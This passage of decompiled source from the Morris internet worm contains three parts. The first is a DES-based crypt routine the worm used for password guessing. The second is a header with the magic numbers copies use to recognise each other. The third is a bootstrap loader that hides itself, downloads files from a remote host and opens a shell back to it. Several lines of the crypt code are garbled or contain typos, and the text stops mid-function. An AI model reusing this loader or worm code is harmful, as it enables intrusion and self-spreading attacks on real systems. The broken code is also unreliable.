   0x00000010,   0x00000010,   0x10001010,   0x10001010,};
int ip_Lf[] = {
   0x00000000,   0x00100000,   0x00000000,   0x00100000,
   0x10000000,   0x10100000,   0x10000000,   0x10100000,
   0x00000000,   0x00100000,   0x00000000,   0x00100000,
   0x10000000,   0x10100000,   0x10000000,   0x10100000,};
int ip_H0[] = {
   0x00000000,   0x00080008,   0x00000000,   0x00080008,
   0x08000800,   0x08080808,   0x08000800,   0x08080808,};
int ip_H1[] = {
   0x00000000,   0x00000000,   0x00080000,   0x00080000,
   0x00000000,   0x00000000,   0x00080000,   0x00080000,
   0x08000000,   0x08000000,   0x08080000,   0x08080000,
   0x08000000,   0x08000000,   0x08080000,   0x08080000,};
int ip_H2[] = {
   0x00000000,   0x00040004,   0x00000000,   0x00040004,
   0x04000400,   0x04040404,   0x04000400,   0x04040404,};
int ip_H3[] = {
   0x00000000,   0x00000000,   0x00040000,   0x00040000,
   0x00000000,   0x00000000,   0x00040000,   0x00040000,
   0x04000000,   0x04000000,   0x04040000,   0x04040000,
   0x04000000,   0x04000000,   0x04040000,   0x04040000,};
int ip_H4[] = {
   0x00000000,   0x00020002,   0x00000000,   0x00020002,
   0x02000200,   0x02020202,   0x02000200,   0x02020202,};
int ip_H5[] = {
   0x00000000,   0x00000000,   0x00020000,   0x00020000,
   0x00000000,   0x00000000,   0x00020000,   0x00020000,
   0x02000000,   0x02000000,   0x02020000,   0x02020000,
   0x02000000,   0x02000000,   0x02020000,   0x02020000,};
int ip_H6[] = {
   0x00000000,   0x00010001,   0x00000000,   0x00010001,
   0x01000100,   0x01010101,   0x01000100,   0x01010101,};
int ip_H7[] = {
   0x00000000,   0x00000000,   0x00010000,   0x00010000,
   0x00000000,   0x00000000,   0x00010000,   0x00010000,
   0x01000000,   0x01000000,   0x01010000,   0x01010000,
   0x01000000,   0x01000000,   0x01010000,   0x01010000,};
int ip_H8[] = {
   0x00000000,   0x00800080,   0x00000000,   0x00800080,
   0x80008000,   0x80808080,   0x80008000,   0x80808080,};
int ip_H9[] = {
   0x00000000,   0x00000000,   0x00800000,   0x00800000,
   0x00000000,   0x00000000,   0x00800000,   0x00800000,
   0x80000000,   0x80000000,   0x80800000,   0x80800000,
   0x80000000,   0x80000000,   0x80800000,   0x80800000,};
int ip_Ha[] = {
   0x00000000,   0x00400040,   0x00000000,   0x00400040,
   0x40004000,   0x40404040,   0x40004000,   0x40404040,};
int ip_Hb[] = {
   0x00000000,   0x00000000,   0x00400000,   0x00400000,
   0x00000000,   0x00000000,   0x00400000,   0x00400000,
   0x40000000,   0x40000000,   0x40400000,   0x40400000,
   0x40000000,   0x40000000,   0x40400000,   0x40400000,};
int ip_Hc[] = {
   0x00000000,   0x00200020,   0x00000000,   0x00200020,
   0x20002000,   0x20202020,   0x20002000,   0x20202020,};
int ip_Hd[] = {
   0x00000000,   0x00000000,   0x00200000,   0x00200000,
   0x00000000,   0x00000000,   0x00200000,   0x00200000,
   0x20000000,   0x20000000,   0x20200000,   0x20200000,
   0x20000000,   0x20000000,   0x20200000,   0x20200000,};
int ip_He[] = {
   0x00000000,   0x00100010,   0x00000000,   0x00100010,
   0x10001000,   0x10101010,   0x10001000,   0x10101010,};
int ip_Hf[] = {
   0x00000000,   0x00000000,   0x00100000,   0x00100000,
   0x00000000,   0x00000000,   0x00100000,   0x00100000,
   0x10000000,   0x10000000,   0x10100000,   0x10100000,
   0x10000000,   0x10000000,   0x10100000,   0x10100000,};
int ipi_L0[] = {
   0x00000000,   0x01000000,   0x00010000,   0x01010000,
   0x00000100,   0x01000100,   0x00010100,   0x01010100,
   0x00000001,   0x01000001,   0x00010001,   0x01010001,
   0x00000101,   0x01000101,   0x00010101,   0x01010101,};
int ipi_L2[] = {
   0x00000000,   0x04000000,   0x00040000,   0x04040000,
   0x00000400,   0x04000400,   0x00040400,   0x04040400,
   0x00000004,   0x04000004,   0x00040004,   0x04040004,
   0x00000404,   0x04000404,   0x00040404,   0x04040404,};
int ipi_L4[] = {
   0x00000000,   0x10000000,   0x00100000,   0x10100000,
   0x00001000,   0x10001000,   0x00101000,   0x10101000,
   0x00000010,   0x10000010,   0x00100010,   0x10100010,
   0x00001010,   0x10001010,   0x00101010,   0x10101010,};
int ipi_L6[] = {
   0x00000000,   0x40000000,   0x00400000,   0x40400000,
   0x00004000,   0x40004000,   0x00404000,   0x40404000,
   0x00000040,   0x40000040,   0x00400040,   0x40400040,
   0x00004040,   0x40004040,   0x00404040,   0x40404040,};
int ipi_L8[] = {
   0x00000000,   0x02000000,   0x00020000,   0x02020000,
   0x00000200,   0x02000200,   0x00020200,   0x02020200,
   0x00000002,   0x02000002,   0x00020002,   0x02020002,
   0x00000202,   0x02000202,   0x00020202,   0x02020202,};
int ipi_La[] = {
   0x00000000,   0x08000000,   0x00080000,   0x08080000,
   0x00000800,   0x08000800,   0x00080800,   0x08080800,
   0x00000008,   0x08000008,   0x00080008,   0x08080008,
   0x00000808,   0x08000808,   0x00080808,   0x08080808,};
int ipi_Lc[] = {
   0x00000000,   0x20000000,   0x00200000,   0x20200000,
   0x00002000,   0x20002000,   0x00202000,   0x20202000,
   0x00000020,   0x20000020,   0x00200020,   0x20200020,
   0x00002020,   0x20002020,   0x00202020,   0x20202020,};
int ipi_Le[] = {
   0x00000000,   0x80000000,   0x00800000,   0x80800000,
   0x00008000,   0x80008000,   0x00808000,   0x80808000,
   0x00000080,   0x80000080,   0x00800080,   0x80800080,
   0x00008080,   0x80008080,   0x00808080,   0x80808080,};
int ipi_H1[] = {
   0x00000000,   0x01000000,   0x00010000,   0x01010000,
   0x00000100,   0x01000100,   0x00010100,   0x01010100,
   0x00000001,   0x01000001,   0x00010001,   0x01010001,
   0x00000101,   0x01000101,   0x00010101,   0x01010101,};
int ipi_H3[] = {
   0x00000000,   0x04000000,   0x00040000,   0x04040000,
   0x00000400,   0x04000400,   0x00040400,   0x04040400,
   0x00000004,   0x04000004,   0x00040004,   0x04040004,
   0x00000404,   0x04000404,   0x00040404,   0x04040404,};
int ipi_H5[] = {
   0x00000000,   0x10000000,   0x00100000,   0x10100000,
   0x00001000,   0x10001000,   0x00101000,   0x10101000,
   0x00000010,   0x10000010,   0x00100010,   0x10100010,
   0x00001010,   0x10001010,   0x00101010,   0x10101010,};
int ipi_H7[] = {
   0x00000000,   0x40000000,   0x00400000,   0x40400000,
   0x00004000,   0x40004000,   0x00404000,   0x40404000,
   0x00000040,   0x40000040,   0x00400040,   0x40400040,
   0x00004040,   0x40004040,   0x00404040,   0x40404040,};
int ipi_H9[] = {
   0x00000000,   0x02000000,   0x00020000,   0x02020000,
   0x00000200,   0x02000200,   0x00020200,   0x02020200,
   0x00000002,   0x02000002,   0x00020002,   0x02020002,
   0x00000202,   0x02000202,   0x00020202,   0x02020202,};
int ipi_Hb[] = {
   0x00000000,   0x08000000,   0x00080000,   0x08080000,
   0x00000800,   0x08000800,   0x00080800,   0x08080800,
   0x00000008,   0x08000008,   0x00080008,   0x08080008,
   0x00000808,   0x08000808,   0x00080808,   0x08080808,};
int ipi_Hd[] = {
   0x00000000,   0x20000000,   0x00200000,   0x20200000,
   0x00002000,   0x20002000,   0x00202000,   0x20202000,
   0x00000020,   0x20000020,   0x00200020,   0x20200020,
   0x00002020,   0x20002020,   0x00202020,   0x20202020,};
int ipi_Hf[] = {
   0x00000000,   0x80000000,   0x00800000,   0x80800000,
   0x00008000,   0x80008000,   0x00808000,   0x80808000,
   0x00000080,   0x80000080,   0x00800080,   0x80800080,
   0x00008080,   0x80008080,   0x00808080,   0x80808080,};
int SP0[] = {
   0x08000820,   0x00000800,   0x00020000,   0x08020820,
   0x08000000,   0x08000820,   0x00000020,   0x08000000,
   0x00020020,   0x08020000,   0x08020820,   0x00020800,
   0x08020800,   0x00020820,   0x00000800,   0x00000020,
   0x08020000,   0x08000020,   0x08000800,   0x00000820,
   0x00020800,   0x00020020,   0x08020020,   0x08020800,
   0x00000820,   0x00000000,   0x00000000,   0x08020020,
   0x08000020,   0x08000800,   0x00020820,   0x00020000,
   0x00020820,   0x00020000,   0x08020800,   0x00000800,
   0x00000020,   0x08020020,   0x00000800,   0x00020820,
   0x08000800,   0x00000020,   0x08000020,   0x08020000,
   0x08020020,   0x08000000,   0x00020000,   0x08000820,
   0x00000000,   0x08020820,   0x00020020,   0x08000020,
   0x08020000,   0x08000800,   0x08000820,   0x00000000,
   0x08020820,   0x00020800,   0x00020800,   0x00000820,
   0x00000820,   0x00020020,   0x08000000,   0x08020800,};
int SP1[] = {
   0x00100000,   0x02100001,   0x02000401,   0x00000000,
   0x00000400,   0x02000401,   0x00100401,   0x02100400,
   0x02100401,   0x00100000,   0x00000000,   0x02000001,
   0x00000001,   0x02000000,   0x02100001,   0x00000401,
   0x02000400,   0x00100401,   0x00100001,   0x02000400,
   0x02000001,   0x02100000,   0x02100400,   0x00100001,
   0x02100000,   0x00000400,   0x00000401,   0x02100401,
   0x00100400,   0x00000001,   0x02000000,   0x00100400,
   0x02000000,   0x00100400,   0x00100000,   0x02000401,
   0x02000401,   0x02100001,   0x02100001,   0x00000001,
   0x00100001,   0x02000000,   0x02000400,   0x00100000,
   0x02100400,   0x00000401,   0x00100401,   0x02100400,
   0x00000401,   0x02000001,   0x02100401,   0x02100000,
   0x00100400,   0x00000000,   0x00000001,   0x02100401,
   0x00000000,   0x00100401,   0x02100000,   0x00000400,
   0x02000001,   0x02000400,   0x00000400,   0x00100001,};
int SP2[] = {
   0x10000008,   0x10200000,   0x00002000,   0x10202008,
   0x10200000,   0x00000008,   0x10202008,   0x00200000,
   0x10002000,   0x00202008,   0x00200000,   0x10000008,
   0x00200008,   0x10002000,   0x10000000,   0x00002008,
   0x00000000,   0x00200008,   0x10002008,   0x00002000,
   0x00202000,   0x10002008,   0x00000008,   0x10200008,
   0x10200008,   0x00000000,   0x00202008,   0x10202000,
   0x00002008,   0x00202000,   0x10202000,   0x10000000,
   0x10002000,   0x00000008,   0x10200008,   0x00202000,
   0x10202008,   0x00200000,   0x00002008,   0x10000008,
   0x00200000,   0x10002000,   0x10000000,   0x00002008,
   0x10000008,   0x10202008,   0x00202000,   0x10200000,
   0x00202008,   0x10202000,   0x00000000,   0x10200008,
   0x00000008,   0x00002000,   0x10200000,   0x00202008,
   0x00002000,   0x00200008,   0x10002008,   0x00000000,
   0x10202000,   0x10000000,   0x00200008,   0x10002008,};
int SP3[] = {
   0x00000080,   0x01040080,   0x01040000,   0x21000080,
   0x00040000,   0x00000080,   0x20000000,   0x01040000,
   0x20040080,   0x00040000,   0x01000080,   0x20040080,
   0x21000080,   0x21040000,   0x00040080,   0x20000000,
   0x01000000,   0x20040000,   0x20040000,   0x00000000,
   0x20000080,   0x21040080,   0x21040080,   0x01000080,
   0x21040000,   0x20000080,   0x00000000,   0x21000000,
   0x01040080,   0x01000000,   0x21000000,   0x00040080,
   0x00040000,   0x21000080,   0x00000080,   0x01000000,
   0x20000000,   0x01040000,   0x21000080,   0x20040080,
   0x01000080,   0x20000000,   0x21040000,   0x01040080,
   0x20040080,   0x00000080,   0x01000000,   0x21040000,
   0x21040080,   0x00040080,   0x21000000,   0x21040080,
   0x01040000,   0x00000000,   0x20040000,   0x21000000,
   0x00040080,   0x01000080,   0x20000080,   0x00040000,
   0x00000000,   0x20040000,   0x01040080,   0x20000080,};
int SP4[] = {
   0x80401000,   0x80001040,   0x80001040,   0x00000040,
   0x00401040,   0x80400040,   0x80400000,   0x80001000,
   0x00000000,   0x00401000,   0x00401000,   0x80401040,
   0x80000040,   0x00000000,   0x00400040,   0x80400000,
   0x80000000,   0x00001000,   0x00400000,   0x80401000,
   0x00000040,   0x00400000,   0x80001000,   0x00001040,
   0x80400040,   0x80000000,   0x00001040,   0x00400040,
   0x00001000,   0x00401040,   0x80401040,   0x80000040,
   0x00400040,   0x80400000,   0x00401000,   0x80401040,
   0x80000040,   0x00000000,   0x00000000,   0x00401000,
   0x00001040,   0x00400040,   0x80400040,   0x80000000,
   0x80401000,   0x80001040,   0x80001040,   0x00000040,
   0x80401040,   0x80000040,   0x80000000,   0x00001000,
   0x80400000,   0x80001000,   0x00401040,   0x80400040,
   0x80001000,   0x00001040,   0x00400000,   0x80401000,
   0x00000040,   0x00400000,   0x00001000,   0x00401040,};
int SP5[] = {
   0x00000104,   0x04010100,   0x00000000,   0x04010004,
   0x04000100,   0x00000000,   0x00010104,   0x04000100,
   0x00010004,   0x04000004,   0x04000004,   0x00010000,
   0x04010104,   0x00010004,   0x04010000,   0x00000104,
   0x04000000,   0x00000004,   0x04010100,   0x00000100,
   0x00010100,   0x04010000,   0x04010004,   0x00010104,
   0x04000104,   0x00010100,   0x00010000,   0x04000104,
   0x00000004,   0x04010104,   0x00000100,   0x04000000,
   0x04010100,   0x04000000,   0x00010004,   0x00000104,
   0x00010000,   0x04010100,   0x04000100,   0x00000000,
   0x00000100,   0x00010004,   0x04010104,   0x04000100,
   0x04000004,   0x00000100,   0x00000000,   0x04010004,
   0x04000104,   0x00010000,   0x04000000,   0x04010104,
   0x00000004,   0x00010104,   0x00010100,   0x04000004,
   0x04010000,   0x04000104,   0x00000104,   0x04010000,
   0x00010104,   0x00000004,   0x04010004,   0x00010100,};
int SP6[] = {
   0x40084010,   0x40004000,   0x00004000,   0x00084010,
   0x00080000,   0x00000010,   0x40080010,   0x40004010,
   0x40000010,   0x40084010,   0x40084000,   0x40000000,
   0x40004000,   0x00080000,   0x00000010,   0x40080010,
   0x00084000,   0x00080010,   0x40004010,   0x00000000,
   0x40000000,   0x00004000,   0x00084010,   0x40080000,
   0x00080010,   0x40000010,   0x00000000,   0x00084000,
   0x00004010,   0x40084000,   0x40080000,   0x00004010,
   0x00000000,   0x00084010,   0x40080010,   0x00080000,
   0x40004010,   0x40080000,   0x40084000,   0x00004000,
   0x40080000,   0x40004000,   0x00000010,   0x40084010,
   0x00084010,   0x00000010,   0x00004000,   0x40000000,
   0x00004010,   0x40084000,   0x00080000,   0x40000010,
   0x00080010,   0x40004010,   0x40000010,   0x00080010,
   0x00084000,   0x00000000,   0x40004000,   0x00004010,
   0x40000000,   0x40080010,   0x40084010,   0x00084000,};
int SP7[] = {
   0x00808200,   0x00000000,   0x00008000,   0x00808202,
   0x00808002,   0x00008202,   0x00000002,   0x00008000,
   0x00000200,   0x00808200,   0x00808202,   0x00000200,
   0x00800202,   0x00808002,   0x00800000,   0x00000002,
   0x00000202,   0x00800200,   0x00800200,   0x00008200,
   0x00008200,   0x00808000,   0x00808000,   0x00800202,
   0x00008002,   0x00800002,   0x00800002,   0x00008002,
   0x00000000,   0x00000202,   0x00008202,   0x00800000,
   0x00008000,   0x00808202,   0x00000002,   0x00808000,
   0x00808200,   0x00800000,   0x00800000,   0x00000200,
   0x00808002,   0x00008000,   0x00008200,   0x00800002,
   0x00000200,   0x00000002,   0x00800202,   0x00008202,
   0x00808202,   0x00008002,   0x00808000,   0x00800202,
   0x00800002,   0x00000202,   0x00008202,   0x00808200,
   0x00000202,   0x00800200,   0x00800200,   0x00000000,
   0x00008002,   0x00008200,   0x00000000,   0x00808002,};
int PC1[] = {
   0x10000000,   0x00000000,   0x00100000,   0x00000000,
   0x00001000,   0x00000000,   0x00000010,   0x00000000,
   0x00000000,   0x00010000,   0x00000000,   0x01000000,
   0x00000001,   0x00000000,   0x00000000,   0x00000000,
   0x20000000,   0x00000000,   0x00200000,   0x00000000,
   0x00002000,   0x00000000,   0x00000020,   0x00000000,
   0x00000000,   0x00020000,   0x00000000,   0x02000000,
   0x00000002,   0x00000000,   0x00000000,   0x00000000,
   0x40000000,   0x00000000,   0x00400000,   0x00000000,
   0x00004000,   0x00000000,   0x00000040,   0x00000000,
   0x00000000,   0x00040000,   0x00000000,   0x04000000,
   0x00000004,   0x00000000,   0x00000000,   0x00000000,
   0x80000000,   0x00000000,   0x00800000,   0x00000000,
   0x00008000,   0x00000000,   0x00000080,   0x00000000,
   0x00000000,   0x00080000,   0x00000000,   0x08000000,
   0x00000008,   0x00000000,   0x00000000,   0x00000000,
   0x01000000,   0x00000000,   0x00010000,   0x00000000,
   0x00000100,   0x00000000,   0x00000000,   0x00000100,
   0x00000000,   0x00001000,   0x00000000,   0x00100000,
   0x00000000,   0x10000000,   0x00000000,   0x00000000,
   0x02000000,   0x00000000,   0x00020000,   0x00000000,
   0x00000200,   0x00000000,   0x00000000,   0x00000200,
   0x00000000,   0x00002000,   0x00000000,   0x00200000,
   0x00000000,   0x20000000,   0x00000000,   0x00000000,
   0x04000000,   0x00000000,   0x00040000,   0x00000000,
   0x00000400,   0x00000000,   0x00000000,   0x00000400,
   0x00000000,   0x00004000,   0x00000000,   0x00400000,
   0x00000000,   0x40000000,   0x00000000,   0x00000000,
   0x08000000,   0x00000000,   0x00080000,   0x00000000,
   0x00000800,   0x00000000,   0x00000000,   0x00000800,
   0x00000000,   0x00008000,   0x00000000,   0x00800000,
   0x00000000,   0x80000000,   0x00000000,   0x00000000,};
int PC2[] = {
   0x00000000,   0x20000000,   0x00000000,   0x00800000,
   0x00000000,   0x00000000,   0x00000000,   0x00040000,
   0x00000010,   0x00000000,   0x00000000,   0x00000000,
   0x00000000,   0x02000000,   0x00000001,   0x00000000,
   0x00000080,   0x00000000,   0x00000000,   0x00100000,
   0x00000000,   0x00000000,   0x00000000,   0x08000000,
   0x00000000,   0x40000000,   0x00000000,   0x00200000,
   0x00000008,   0x00000000,   0x00000000,   0x10000000,
   0x00000000,   0x04000000,   0x00000000,   0x00080000,
   0x00000000,   0x80000000,   0x00000040,   0x00000000,
   0x00000000,   0x00400000,   0x00000000,   0x00000000,
   0x00000004,   0x00000000,   0x00000000,   0x01000000,
   0x00000000,   0x00000000,   0x00000000,   0x00000000,
   0x00000000,   0x00000000,   0x00000000,   0x00000000,
   0x00000000,   0x00000000,   0x00000000,   0x00000000,
   0x00000000,   0x00000000,   0x00000000,   0x00000000,
   0x08000000,   0x00000000,   0x00000100,   0x00000000,
   0x02000000,   0x00000000,   0x00010000,   0x00000000,
   0x04000000,   0x00000000,   0x00400000,   0x00000000,
   0x00001000,   0x00000000,   0x00004000,   0x00000000,
   0x00000000,   0x00000000,   0x00100000,   0x00000000,
   0x20000000,   0x00000000,   0x00020000,   0x00000000,
   0x00000200,   0x00000000,   0x80000000,   0x00000000,
   0x00800000,   0x00000000,   0x00002000,   0x00000000,
   0x40000000,   0x00000000,   0x00000000,   0x00000000,
   0x00040000,   0x00000000,   0x00000400,   0x00000000,
   0x00200000,   0x00000000,   0x00000000,   0x00000000,
   0x00080000,   0x00000000,   0x10000000,   0x00000000,
   0x00000000,   0x00000000,   0x00008000,   0x00000000,
   0x00000800,   0x00000000,   0x01000000,   0x00000000,
   0x00000000,   0x00020000,   0x00000002,   0x00000000,
   0x00000020,   0x00000000,   0x00000000,   0x00010000,};
 
static extra;
char E[48];                 /* 0x255c4 */
 
char *crypt(passwd, salt)           /* 0x68f8 */
     char *passwd, *salt;
{
    int temp, l8;
    register i, j;
    register  c;                /*d7, d6, d5*/
    static char iobuf[10];          /* 0x27f34 */
    static unsigned x27f44;
    static unsigned x27f48;
 
    x27f44 = 0;
    x27f48 = 0;
 
    for( i = 0; i < 48; i++)
    E[i] = e[i];
 
    for(i = 0; (c = *passwd)  &&  (i < 32); i++, passwd++)
    for(j = 0; j < 7; j++, i++) {
        l8 = (c >> (6 - j)) & 01;
        x27f44 |= (l8 << (31 - i));
    }
 
    for (i = 0; (c = *passwd)  &&  (i < 32); i++, passwd++)
    for(j = 0; j < 7; j++, i++) {
        l8 = (c >> (6 - j)) & 01;
        x27f48 |= (l8 << (31 - i));
    }
 
    compkeys(&x27f44, 0);
 
    for(i=0;i<2;i++){
    c = *salt++;
    iobuf[i] = c;
    if(c>'Z') c -= 6;
    if(c>'9') c -= 7;
    c -= '.';
    for(j=0;j<6;j++){
        if((c>>j) & 01){
        temp = E[6*i+j];
        E[6*i+j] = E[6*i+j+24];
        E[6*i+j+24] = temp;
        }
    }
    }
 
    mungE();
    x27f44 = 0;
    x27f48 = 0;
    des(&x27f44, &x27f44);
    ipi(&x27f44, &x27f44);
 
    for(i=0; i<11; i++){
    c = x27f44 >> 26;
    x27f44  = x27f44 << 6;
    x27f44 |= x27f48 >> 26;
    x27f48 = x27f48 << 6;
    c += '.';
    if(c > '9') c += 7;
    if(c > 'Z') c += 6;
    iobuf[i+2] = c;
    }
    iobuf[i+2] = 0;
    if(iobuf[1] == 0)
    iobuf[1] = iobuf[0];
    return(iobuf);
}
 
int E_H[8][16];                 /* 0x251c4 */
int E_L[8][16];                 /* 0x253c4 */
mungE()                     /* 0x6b2a */
{
    register i, j, d5, d4, d3, d2;
    register *a5, *a4;
    int l28;
 
    for(i = 0; i < 8; i++) {
    a5 = E_L[i];
    a4 = E_H[i];
    for(j = 0; j < 16; j++) {
        *a5++ = 0;
        *a4++ = 0;
    }
    }
    for (j = 0; j < 32; j++) {
    d2 = 1 << (31 - j);
    d3 = 31 - E[j];
    d4 = 1 << (d3 & 3);
    a5 = E_L[d3 >> 2];
    for (i = 1; i < 16; i++)
        if (i & d4)
        a5[i] |= d2;
    }
    for (j = 32; j < 48; j++) {
    d2 = 1 << (63-j);
    d3 = 31 - E[j];
    d4 = 1 << (d3 & 3);
    a5 = E_H[d3 >> 2];
    for (i = 1; i < 16; i++)
        if (i & d4)
        a5[i] |= d2;
    }
}
 
int keys_H[16], keys_L[16];         /* 0x255f4,0x25634 */
 
compkeys(iptr, key)                 /* 0x6c04 */
     int *iptr;
{
    int i, l8, l12, l16;
    register d7, d6, d5, d4, d3, d2;
 
    d7 = 0;
    d6 = 0;
    for (d3 = 0, d2 = iptr[1];  d3 < 64; d2*=2, d3+=2)
    if (d2 < 0) {
        d7 |= PC1[d3];
        d6 |= PC1[d3+1];
    }
 
    for (d2 = iptr[0];  d3 < 128; d2*=2, d3+=2)
    if (d2 < 0) {
        d7 |= PC1[d3];
        d6 |= PC1[d3+1];
    }
 
 
    for (i = 0; i < 16; i++) {
    for (d2 = 0; d2 < shift[i]; d2++) {
        l16 = l12 = l8 = 0;
        if (d7 < 0)
        l8 = 16;
        if (d7 & 0x08)
        l12 = 256;
        if (d6 < 0)
        l16 = 1;
        d7 = ((d7 << 1) & ~0x10) | l8 | l16;
        d6 = (d6 << 1) | l12;
    }
 
 
    d5 = 0;
    d4 = 0;
    for (d3=0, d2=d6;  d3 < 64;  d2*=2, d3+=2) {
        if (d2 < 0) {
        d5 |= PC2[d3];
        d4 |= PC2[d3+1];
        }
    }
    for (d2=d7;  d3 < 128;  d2*=2, d3+=2) {
        if (d2 < 0) {
        d5 |= PC2[d3];
        d4 |= PC2[d3+1];
        }
    }
 
    if (key) {
        keys_L[15-i] = d5;
        keys_H[15-i] = d4;
    } else {
        keys_L[i] = d5;
        keys_H[i] = d4;
    }
    }
 
}
 
setupE()
{
    int i, j, l12;
 
    for(i = 0; i < 8; i++)
    for(j = 0; j < 16; j++)
        E_H[i][j] = E_H[i][j] = 0;
 
    for (j = 0; j < 32; j++) {
    l12 = 31 - E[j];
    for (i = 0; i < 16; i++)
        if ((1 << (l12 % 4)) & i)
        E_L[l12 / 4][i] |= (1 << (31 - j));
    }
 
    for (j = 32; j < 48; j++) {
    l12 = 31 - E[j];
    for (i = 0; i < 16; i++)
        if ((1 << (l12 % 4)) & i)
        E_H[l12 / 4][i] |= (1 << (63 - j));
    }
}
 
des(adr1, adr2)
     int *adr1, *adr2;
{
    int l4, *l8, *l12, l16;
    register unsigned d7;
    register unsigned d6, d5;
    register d4, d3, d2;
 
    l4 = adr1[0];
    d2 = adr1[1];
    for (l16 = 0; l16 < 25; l16++) {
    l8 = keys_L;
    l12 = keys_H;
    for( d3 = 0;  d3 < 16;  d3++) {
        d5 = d2;
        d7 = E_L[0][d4 = d5 & 0x0f];
        d6 = E_H[0][d4];
        d5 >>= 4;
        d7 |= E_L[1][d4 = (d5 & 0x0f)];
        d6 |= E_H[1][d4];
        d5 >>= 4;
        d7 |= E_L[2][d4 = (d5 & 0x0f)];
        d6 |= E_H[2][d4];
        d5 >>= 4;
        d7 |= E_L[3][d4 = (d5 & 0x0f)];
        d6 |= E_H[3][d4];
        d5 >>= 4;
        d7 |= E_L[4][d4 = (d5 & 0x0f)];
        d6 |= E_H[4][d4];
        d5 >>= 4;
        d7 |= E_L[5][d4 = (d5 & 0x0f)];
        d6 |= E_H[5][d4];
        d5 >>= 4;
            d7 |= E_L[6][d4 = (d5 & 0x0f)];
            d6 |= E_H[6][d4];
            d5 >>= 4;
            d7 |= E_L[7][d4 = (d5 & 0x0f)];
            d6 |= E_H[7][d4];
            d7 ^= *l8++;
            d6 ^= *l12++;

            d5 = SPO[(d6 >> 16) & 0x3f];
            d5 |= SP1[(d6 >> 22) & 00x3f];
            d5 |= SP2[((d7 & 0x03) << 4) | ((d6 >> 28) & 0x0f)];
            d5 |= SP3[(d7 >> 2) & 0x3f];
            d5 |= SP4[(d7 >> 8) & 0x3f];
            d5 |= SP5[(d7 >> 14) & 0x3f];
            d5 |= SP6[(d7 >> 20) & 0x3f];
            d5 |= SP7[(d7 >> 26) & 0x3f];
            {   d6 = 14;
                l4 = d2;
                d2 = d6 ^ d5;
            }
       }
       d5 = l4;
       l4 = d2;
       d2 = d5;
   }
   adr2[0] = l4;
   adr2[1] = d2;
}
ipi(iptr1, iptr2)
            int *iptr1, *iptr2;
{
   register unsigned d7, d6, d5;

   d5 = iptr1[0];
   d7 = ipi_L0[d5 & 0x0f];
   d5 = >>= 4;
   d6 = ipi_H1[d5 & 0x0f];

   d5 >>= 4;
   d7 |= ipi_L2[d5 & 0x0f];
   d5 >>= 4;
   d6 |= ipi_H3[d5 & 0x0f];

   d5 >>= 4;
   d7 |= ipi_L4[d5 & 0x0f];
   d5 >>= 4;
   d6 |= ipi_H5[d5 & 0x0f];

   d5 >>= 4;
   d7 | ipi_L6[d5 & 0x0f];
   d5 >>=4;
   d6 |= ipi_H7[d5 & 0x0f];

   d5 = iptr1[1];
   d7 |= ipi_L8[d5 & 0x0f];
   d5 >>= 4;
   d6 |= ipi_H9[d5 & 0x0f];

   d5 >>= 4;
   d7 |= ipi_La[d5 & 0x0f];
   d5 >>= 4;
   d6 |= ipi_Hb[d5 & 0x0f];

   d5 >>=4;
   d7 |= ipi_Lc[d5 & 0x0f];
   d5 >>= 4;
   d6 |= ipi_Hd[d5 & 0x0f];

   d5 >>= 4;
   d7 |= ipi_Le[d5 & 0x0f];
   d5 >>= 4;
   d6 |= ipi_Hf[d5 & 0x0f];

   iptr2[0] = d7;
   ipyr2[1] = d6;
}

/*
 * Local variables:
 * compile-command: "make"
 * comment-collumn: 48
 * End:
 */
*****
** worm.h
*****


/* Magic numbers the program uses to identify other copies of itself. */
/* Released by gobo in 1993, send e-mail to Gobo@dutiba.twi.tudelft.nl */

#define REPORT_PORT 0x2c5d
#define MAGIC_1 0x00148898
#define MAGIC_2 0x00874697
extern int pleasequit;      /* This stops the program after one
                 * complete pass if set.  It is incremented
                 * inside of checkother if contact with another
                 * happens. */

/* There are pieces of "stub" code, presumably from something like this to
   get rid of error messages */
#define error()

/* This appears to be a structure unique to this program.  It doesn't seem that
 * the blank slots are really an array of characters for the hostname, but
 * maybe they are.
 */
struct hst {
    char *hostname;
    int l4, l8, l12, l16, l20, l24, o28, o32, o36, o40, o44;
    int o48[6];                 /* used */
    int flag;                   /* used */
#define HST_HOSTEQUIV   8
#define HST_HOSTFOUR    4
#define HST_HOSTTWO 2
    struct hst *next;               /* o76 */
};

typedef struct {
    char *name;
    unsigned long size;
    char *buf;
} object;

extern struct ifses {
    int if_l0, if_l4, if_l8, if_l12; /* unused */
    int if_l16;         /* used */
    int if_l20;         /* unused */
    int if_l24;         /* used */
    short if_l28;       /* unused */
} ifs[];
extern nifs;

extern int ngateways;

extern object objects[], *getobjectbyname();
extern int nobjects;

/* Only used for a2in().  Why?  I don't know. */
struct bar {int baz;};
extern struct bar *a2in();

*****
** x8113550.c
*****


#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

main(argc, argv)
char *argv[];
{
    struct sockaddr_in sin;
    int s, i, magic, nfiles, j, len, n;
    FILE *fp;
    char files[20][128];
    char buf[2048], *p;

    unlink(argv[0]);
    if(argc != 4)
        exit(1);
    for(i = 0; i < 32; i++)
        close(i);
    i = fork();
    if(i < 0)
        exit(1);
    if(i > 0)
        exit(0);

    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    sin.sin_port = htons(atoi(argv[2]));
    magic = htonl(atoi(argv[3]));

    for(i = 0; i < argc; i++)
        for(j = 0; argv[i][j]; j++)
            argv[i][j] = '\0';

    s = socket(AF_INET, SOCK_STREAM, 0);
    if(connect(s, &sin, sizeof(sin)) < 0){
        perror("l1 connect");
        exit(1);
    }
    dup2(s, 1);
    dup2(s, 2);

    write(s, &magic, 4);

    nfiles = 0;
    while(1){
        if(xread(s, &len, 4) != 4)
            goto bad;
        len = ntohl(len);
        if(len == -1)
            break;

        if(xread(s, &(files[nfiles][0]), 128) != 128)
            goto bad;

        unlink(files[nfiles]);
        fp = fopen(files[nfiles], "w");
        if(fp == 0)
            goto bad;
        nfiles++;

        while(len > 0){
            n = sizeof(buf);
            if(n > len)
                n = len;
            n = read(s, buf, n);
            if(n <= 0)
                goto bad;
            if(fwrite(buf, 1, n, fp) != n)
                goto bad;
            len -= n;
        }
        fclose(fp);
    }

    execl("/bin/sh", "sh", 0);
bad:
    for(i = 0; i < nfiles; i++)
        unlink(files[i]);
    exit(1);
}

static
xread(fd, buf, n)
char *buf;
{
    int cc, n1;

    n1 = 0;
    while(n1 < n){
        cc = read(fd, buf, n - n1);
